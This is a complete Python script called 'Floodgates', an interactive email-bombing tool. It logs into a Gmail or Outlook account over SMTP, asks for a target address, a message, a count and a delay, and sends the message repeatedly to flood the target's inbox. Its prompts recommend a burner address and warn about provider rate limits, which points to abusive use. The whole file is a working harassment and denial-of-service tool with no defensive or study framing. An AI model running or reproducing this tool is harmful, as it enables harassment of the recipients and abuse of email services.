from os import times
import smtplib
from time import sleep
from getpass import getpass

class colors():
    red = "\u001b[31m"
    yel = "\u001b[33m"
    gre = "\u001b[32m"
    blu = "\u001b[34m"
    pur = "\u001b[35m"
    cya = "\u001b[36m"
    whi = "\u001b[37m"
    res = "\u001b[0m"
    bred = "\u001b[31;1m"
    byel = "\u001b[33;1m"
    bgre = "\u001b[32;1m"
    bblu = "\u001b[34;1m"
    bpur = "\u001b[35;1m"
    bcya = "\u001b[36;1m"
    bwhi = "\u001b[37;1m"

class OptionNotValid(Exception):
    
    ### Exception to be raised if an invalid choice is made.

    def __init__(self, prv):
        self.prv = prv
        self.message = ("The given option wasn't valid. Please try again, using the numbers provided.")
        super().__init__(self.message)

mdbg = False

print(colors.bcya + "╔═════════════════════════════════════════════════════════╗")
print("║     ________                __            __            ║")
print("║    / ____/ ____  ____  ____/ ____ _____ _/ /____  _____ ║")
print("║   / /_  / / __ \/ __ \/ __  / __ `/ __ `/ __/ _ \/ ___/ ║")
print("║  / __/ / / /_/ / /_/ / /_/ / /_/ / /_/ / /_/  __(__  )  ║")
print("║ /_/   /_/\____/\____/\____/\__  /\____/\__/\___/____/   ║")
print("║                          /____/      by simbyte         ║")
print("╚═════════════════════════════════════════════════════════╝" + colors.res)

# Floodgates vA_0302-1

def flooder():
    # This section verifies your provider to allow a proper SMTP connection.
    print('''┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ Please select your email provider from the following list; ┃
┃                                                            ┃
┃ ▷ 1: Gmail                                                 ┃
┃ ▷ 2: Live/Outlook/Hotmail                                  ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛''')
    prov = input('> ').lower()
    if prov == "1":
        mail = smtplib.SMTP('smtp.gmail.com',587)
        print(colors.bpur + "╼Set mail provider to Gmail.╾ " + colors.res)
        print('''┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ Please enter the email address you wish to send messages from. ┃
┃ ''' + colors.bred + '<< Warning >>' + colors.res + ''' It is recommended to use a burner address.       ┃
┃ Your email address must use the provider listed above.         ┃
┃ ''' + colors.bred + '<< Warning >>' + colors.res + ''' You will not be able to use this through a       ┃
┃ Google account if you have Two-Step Verification,              ┃
┃ or have not allowed less-secure apps.                          ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛''')
    elif prov == "2":
        mail = smtplib.SMTP('smtp-mail.outlook.com',587)
        print(colors.bpur + "╼Set mail provider to Live.╾ " + colors.res)
        print('''┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ Please enter the email address you wish to send messages from. ┃
┃ ''' + colors.bred + '<< Warning >>' + colors.res + ''' It is recommended to use a burner address.       ┃
┃ Your email address must use the provider listed above.         ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛''')
    else:
        raise OptionNotValid(prov)

    # This section gets the information of the user to send the messages.
    email = input("> ")
    while True:
        # This is an escape sequence allowing someone to type an escape sequence and retry their password.
        print('''┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ Please enter the password to the email you provided.        ┃
┃ ''' + colors.bred + '<< Warning >>' + colors.res + ''' This will NOT echo back.                      ┃
┃ Ensure you typed it correctly. If you believe you have      ┃
┃ input it incorrectly, you can enter ;;ex1 at any point      ┃
┃ to retry its entry.                                         ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛''')
        password = getpass("> ")
        if password.find(";;ex1") == -1:
            break
        else:
            pass
            
    # This section verifies the target's info, the message, and the frequency of sending.
    target = input("Please enter target email address: ")
    print("Please enter the mail body you wish to send:")
    message = input("")
    getCountDelay = True
    timesLooped = 0
    while getCountDelay:
        try:
            print("Please enter the number of messages you wish to send:")
            count = int(input("> "))
            if count > 1:
                print("Please enter the delay in-between sending you want, in seconds.")
                print(colors.bred + '<< Warning >>' + colors.res + ' Numbers closer to 0 may get limited, and result in the blocking of your provided email address.')
                print("The delay will be ignored if your message count is 1.")
                delay = int(input("> "))
                getCountDelay = False
            else:
                delay = 0
                getCountDelay = False
        except ValueError as e:
            en = str(type(e).__name__)
            print(colors.bred + 'Oops!' + colors.bblu + ' "' + str(e.__context__) + '" is not a valid number.' + colors.res)
            print("Please try again. Make sure that your input is a number (e.g. 1, 2, 3, 4 etc.)")

    print(colors.bcya + '<< Notice >>' + colors.res + ' Beginning to send messages. Please wait...' + colors.gre)

    # Establishes the connection to the SMTP server for sending.
    if mdbg:
        mail.set_debuglevel(1)
    mail.ehlo()
    mail.starttls()
    mail.login(email,password)

    # Sends the message(s)!
    for x in range(0,count):
        mail.sendmail(email,target,message)
        print(colors.res + "Messages sent: " + str(x+1) + colors.gre) 
        sleep(delay)
    mail.close()
    print(colors.bgre + "Success! All messages were successfully sent to the recipient you provided." + colors.res)

try:
    sleep(3)
    for i in range (0,2):
        print('')
        i += 1
    print(colors.bgre + '''
                       d8b                                 
                       88P                                 
                       888                                  
 ?88   d8P  d8P d8888b 888  d8888b d8888b   88bd8b,d88b  d8888b
 d88  d8P' d8P d8b_,dp 88  d8P' ` d8P' ?88  88P'`?8P'?8 d8b_,dP
 ?8b ,88b ,88' 88b     88b 88b    88b  d88 d88  d88  88 88b    
 `?888P'888P' ` ?888P'  88b`?888P` ?8888P d88' d88' d88 `?888P' ''' + colors.res)
    # This is the main menu. This allows you to enable debugging if you need.
    while True:
        if not mdbg:
            print('''┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ What do you want to do today? ┃
┃                               ┃
┃ ▷ 1: Begin Flooding           ┃
┃ ▷ 2: Toggle Debugging (OFF)   ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛''')
        else:
            print('''┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ What do you want to do today? ┃
┃                               ┃
┃ ▷ 1: Begin Flooding           ┃
┃ ▷ 2: Toggle Debugging (ON)    ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛''')
        opt1 = input("> ")
        if opt1 == "1": 
            flooder()
        if opt1 == "2":
            if not mdbg:
                mdbg = True
            else:
                mdbg = False
            print("")
            print(colors.bpur + "Toggled debugging to " + colors.bblu + str(mdbg) + colors.bpur + "!" + colors.res)
            print("")
        
except Exception as e:
    en = str(type(e).__name__)
    if en == "SMTPAuthenticationError":
        print(colors.bred + '[FATAL] Something went wrong!' + colors.res)
        print('The SMTP connection closed due to an authentication issue.')
        print('Python specifically returned with this information;')
        print(en + ": " + colors.bblu + str(e) + colors.res)
    else:
        print(colors.bred + '[FATAL] Something went wrong!' + colors.res)
        print('Python reported an error with the following information:')
        print(colors.yel + en + ": " + colors.bblu + str(e) + colors.res)
        print('Try to run the script again. Make sure all values are valid.')
